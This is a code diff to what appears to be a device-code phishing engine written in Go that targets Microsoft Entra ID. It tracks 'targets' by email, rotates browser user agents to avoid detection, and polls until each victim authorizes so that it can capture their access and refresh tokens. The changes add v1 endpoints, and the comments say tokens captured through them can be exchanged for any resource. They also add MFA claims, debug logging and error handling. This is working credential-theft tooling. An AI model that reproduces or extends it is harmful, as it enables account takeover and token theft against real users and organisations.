@@ -16,17 +16,24 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"log"
 	"math/rand"
 	"net/http"
 	"net/url"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
 )
 
 const (
-	deviceAuthURL = "https://login.microsoftonline.com/%s/oauth2/v2.0/devicecode"
-	tokenURL      = "https://login.microsoftonline.com/%s/oauth2/v2.0/token"
+	deviceAuthURLv2 = "https://login.microsoftonline.com/%s/oauth2/v2.0/devicecode"
+	tokenURLv2      = "https://login.microsoftonline.com/%s/oauth2/v2.0/token"
+
+	// v1 endpoints — use resource= instead of scope=. Tokens captured via v1
+	// can be exchanged for any resource including My Sign-ins (19db86c3-...).
+	deviceAuthURLv1 = "https://login.microsoftonline.com/%s/oauth2/devicecode"
+	tokenURLv1      = "https://login.microsoftonline.com/%s/oauth2/token?api-version=1.0"
 )
 
 // userAgents is a pool of realistic Windows browser user agents used to avoid
@@ -54,14 +61,40 @@ func jitterDuration(d time.Duration) time.Duration {
 	return d - jitter
 }
 
-// DeviceCodeResponse is what Microsoft returns when we initiate a device flow
+// FlexInt unmarshals a JSON field that Microsoft returns as either a number or
+// a quoted string depending on the endpoint version (v1 uses strings, v2 uses ints).
+type FlexInt int
+
+func (f *FlexInt) UnmarshalJSON(b []byte) error {
+	// Try number first.
+	var n int
+	if err := json.Unmarshal(b, &n); err == nil {
+		*f = FlexInt(n)
+		return nil
+	}
+	// Fall back to quoted string.
+	var s string
+	if err := json.Unmarshal(b, &s); err != nil {
+		return err
+	}
+	n, err := strconv.Atoi(s)
+	if err != nil {
+		return fmt.Errorf("FlexInt: cannot parse %q: %w", s, err)
+	}
+	*f = FlexInt(n)
+	return nil
+}
+
+// DeviceCodeResponse is what Microsoft returns when we initiate a device flow.
+// v1 uses "verification_url"; v2 uses "verification_uri" — we accept both.
 type DeviceCodeResponse struct {
-	DeviceCode      string `json:"device_code"`
-	UserCode        string `json:"user_code"`
-	VerificationURI string `json:"verification_uri"`
-	ExpiresIn       int    `json:"expires_in"`
-	Interval        int    `json:"interval"`
-	Message         string `json:"message"`
+	DeviceCode      string  `json:"device_code"`
+	UserCode        string  `json:"user_code"`
+	VerificationURI string  `json:"verification_uri"`
+	VerificationURL string  `json:"verification_url"` // v1 alias
+	ExpiresIn       FlexInt `json:"expires_in"`
+	Interval        FlexInt `json:"interval"`
+	Message         string  `json:"message"`
 
 	// Internal tracking
 	TargetID    string    `json:"target_id"`
@@ -76,7 +109,7 @@ type TokenResult struct {
 	RefreshToken string `json:"refresh_token"`
 	IDToken      string `json:"id_token"`
 	TokenType    string `json:"token_type"`
-	ExpiresIn    int    `json:"expires_in"`
+	ExpiresIn    FlexInt `json:"expires_in"`
 	Scope        string `json:"scope"`
 
 	// Correlation metadata
@@ -88,6 +121,12 @@ type TokenResult struct {
 	// Extracted from JWT claims at capture time
 	TenantID         string `json:"tenant_id,omitempty"`
 	CapturedClientID string `json:"captured_client_id,omitempty"`
+
+	// Set for tokens obtained via Token Exchange (not device code capture).
+	Label       string `json:"label,omitempty"`        // e.g. "Microsoft Graph"
+	Source      string `json:"source,omitempty"`       // "exchange" when set
+	ReqScope    string `json:"req_scope,omitempty"`    // v2 scope used for exchange
+	ReqResource string `json:"req_resource,omitempty"` // v1 resource used for exchange
 }
 
 // jwtClaims holds the subset of JWT claims we care about.
@@ -184,11 +223,14 @@ type Engine struct {
 	mu       sync.RWMutex
 	sessions map[string]*Session // keyed by target ID
 
-	tenantID  string
-	clientID  string
-	scope     string
-	interval  time.Duration
-	userAgent string // fixed for this engine instance
+	tenantID   string
+	clientID   string
+	scope      string // v2 scope string OR v1 resource URL (when captureV1=true)
+	captureV1  bool   // use v1 endpoints with resource= instead of v2 scope=
+	requireMFA bool   // add claims to force MFA during device code auth
+	debug      bool   // log full request/response bodies for troubleshooting
+	interval   time.Duration
+	userAgent  string // fixed for this engine instance
 
 	// Channel for completed sessions
 	Results chan *TokenResult
@@ -196,16 +238,25 @@ type Engine struct {
 	httpClient *http.Client
 }
 
-func NewEngine(tenantID, clientID, scope string, pollIntervalSec int) *Engine {
+func NewEngine(tenantID, clientID, scope string, pollIntervalSec int, captureV1, requireMFA, debug bool) *Engine {
 	interval := time.Duration(pollIntervalSec) * time.Second
 	if interval < 5*time.Second {
 		interval = 5 * time.Second // Microsoft minimum
+	}
+	// Auto-detect v1 mode: if scope is a resource URL (https:// or urn:), the
+	// operator clearly wants v1 endpoints (resource= param). No need to set
+	// capture_v1 = true in config when the scope already makes the intent clear.
+	if !captureV1 && (strings.HasPrefix(scope, "https://") || strings.HasPrefix(scope, "urn:")) {
+		captureV1 = true
 	}
 	return &Engine{
 		sessions:   make(map[string]*Session),
 		tenantID:   tenantID,
 		clientID:   clientID,
 		scope:      scope,
+		captureV1:  captureV1,
+		requireMFA: requireMFA,
+		debug:      debug,
 		interval:   interval,
 		userAgent:  pickUA(),
 		Results:    make(chan *TokenResult, 256),
@@ -225,11 +276,39 @@ func (e *Engine) newRequest(ctx context.Context, method, url string, body io.Rea
 
 // RequestDeviceCode initiates a device code flow for one target.
 func (e *Engine) RequestDeviceCode(ctx context.Context, targetID, targetEmail string) (*DeviceCodeResponse, error) {
-	authURL := fmt.Sprintf(deviceAuthURL, e.tenantID)
+	var authURL string
+	if e.captureV1 {
+		authURL = fmt.Sprintf(deviceAuthURLv1, e.tenantID)
+	} else {
+		authURL = fmt.Sprintf(deviceAuthURLv2, e.tenantID)
+	}
 
 	form := url.Values{}
 	form.Set("client_id", e.clientID)
-	form.Set("scope", e.scope)
+	if e.captureV1 {
+		// v1 endpoint uses resource= (must be a URL or GUID, not a scope string).
+		// If the operator left a v2-style scope string, default to Graph.
+		resource := e.scope
+		if !strings.HasPrefix(resource, "https://") && !strings.HasPrefix(resource, "urn:") {
+			resource = "https://graph.microsoft.com"
+		}
+		form.Set("resource", resource)
+	} else {
+		form.Set("scope", e.scope)
+	}
+	if e.requireMFA {
+		if e.captureV1 {
+			// v1 endpoint uses amr_values= for MFA step-up.
+			form.Set("amr_values", "ngcmfa")
+		} else {
+			// v2 endpoint uses the claims parameter.
+			form.Set("claims", `{"access_token":{"amr":{"essential":true,"values":["ngcmfa"]}}}`)
+		}
+	}
+
+	if e.debug {
+		log.Printf("[DEBUG] devicecode → %s  body: %s", authURL, form.Encode())
+	}
 
 	req, err := e.newRequest(ctx, "POST", authURL, strings.NewReader(form.Encode()))
 	if err != nil {
@@ -244,6 +323,9 @@ func (e *Engine) RequestDeviceCode(ctx context.Context, targetID, targetEmail st
 	defer resp.Body.Close()
 
 	body, _ := io.ReadAll(resp.Body)
+	if e.debug {
+		log.Printf("[DEBUG] devicecode ← %d  body: %s", resp.StatusCode, string(body))
+	}
 	if resp.StatusCode != 200 {
 		return nil, fmt.Errorf("device code endpoint returned %d: %s", resp.StatusCode, string(body))
 	}
@@ -257,6 +339,10 @@ func (e *Engine) RequestDeviceCode(ctx context.Context, targetID, targetEmail st
 	dcr.TargetEmail = targetEmail
 	dcr.IssuedAt = time.Now().UTC()
 	dcr.ExpiresAt = dcr.IssuedAt.Add(time.Duration(dcr.ExpiresIn) * time.Second)
+	// Normalise v1 "verification_url" → "verification_uri"
+	if dcr.VerificationURI == "" && dcr.VerificationURL != "" {
+		dcr.VerificationURI = dcr.VerificationURL
+	}
 
 	session := &Session{
 		DeviceCode: &dcr,
@@ -349,12 +435,33 @@ func (e *Engine) StartPolling(ctx context.Context, targetID string) {
 }
 
 func (e *Engine) poll(ctx context.Context, session *Session) (*TokenResult, bool, error) {
-	tokenEndpoint := fmt.Sprintf(tokenURL, e.tenantID)
+	var tokenEndpoint string
+	if e.captureV1 {
+		tokenEndpoint = fmt.Sprintf(tokenURLv1, e.tenantID)
+	} else {
+		tokenEndpoint = fmt.Sprintf(tokenURLv2, e.tenantID)
+	}
 
 	form := url.Values{}
-	form.Set("grant_type", "urn:ietf:params:oauth:grant-type:device_code")
 	form.Set("client_id", e.clientID)
-	form.Set("device_code", session.DeviceCode.DeviceCode)
+	// Both v1 and v2 use the same URN grant type. The differences are:
+	//   v1: field is "code=", and "resource=" must be included
+	//   v2: field is "device_code=", no resource
+	form.Set("grant_type", "urn:ietf:params:oauth:grant-type:device_code")
+	if e.captureV1 {
+		form.Set("code", session.DeviceCode.DeviceCode)
+		resource := e.scope
+		if !strings.HasPrefix(resource, "https://") && !strings.HasPrefix(resource, "urn:") {
+			resource = "https://graph.microsoft.com"
+		}
+		form.Set("resource", resource)
+	} else {
+		form.Set("device_code", session.DeviceCode.DeviceCode)
+	}
+
+	if e.debug {
+		log.Printf("[DEBUG] poll → %s  body: %s", tokenEndpoint, form.Encode())
+	}
 
 	req, err := e.newRequest(ctx, "POST", tokenEndpoint, strings.NewReader(form.Encode()))
 	if err != nil {
@@ -369,6 +476,9 @@ func (e *Engine) poll(ctx context.Context, session *Session) (*TokenResult, bool
 	defer resp.Body.Close()
 
 	body, _ := io.ReadAll(resp.Body)
+	if e.debug {
+		log.Printf("[DEBUG] poll ← %d  body: %s", resp.StatusCode, string(body))
+	}
 
 	if resp.StatusCode == 200 {
 		var token TokenResult
@@ -398,12 +508,20 @@ func (e *Engine) poll(ctx context.Context, session *Session) (*TokenResult, bool
 		// Microsoft is asking us to back off — add extra jitter on top
 		time.Sleep(jitterDuration(10 * time.Second))
 		return nil, false, nil
-	case "authorization_declined":
+	case "authorization_declined", "access_denied": // v2 / v1
 		return nil, true, fmt.Errorf("target declined authorization")
-	case "expired_token":
+	case "expired_token", "code_expired": // v2 / v1
 		return nil, true, fmt.Errorf("device code expired")
 	default:
-		return nil, true, fmt.Errorf("poll error: %s - %s", pollErr.Error, pollErr.ErrorDescription)
+		desc := pollErr.ErrorDescription
+		if pollErr.Error == "" && desc == "" {
+			// Empty response or non-JSON body — keep polling.
+			return nil, false, nil
+		}
+		// Log the full error so the operator can see exactly what Microsoft returned.
+		log.Printf("[POLL ERROR] target=%s error=%q desc=%q",
+			session.DeviceCode.TargetEmail, pollErr.Error, desc)
+		return nil, true, fmt.Errorf("%s: %s", pollErr.Error, desc)
 	}
 }
 
@@ -437,7 +555,7 @@ func (e *Engine) resolveUPN(ctx context.Context, result *TokenResult) {
 // tokens; if the server does not return a new refresh_token the caller should
 // preserve the original.
 func RefreshAccessToken(ctx context.Context, tenantID, clientID, refreshToken, scope string) (*TokenResult, error) {
-	endpoint := fmt.Sprintf(tokenURL, tenantID)
+	endpoint := fmt.Sprintf(tokenURLv2, tenantID)
 	form := url.Values{}
 	form.Set("grant_type", "refresh_token")
 	form.Set("client_id", clientID)
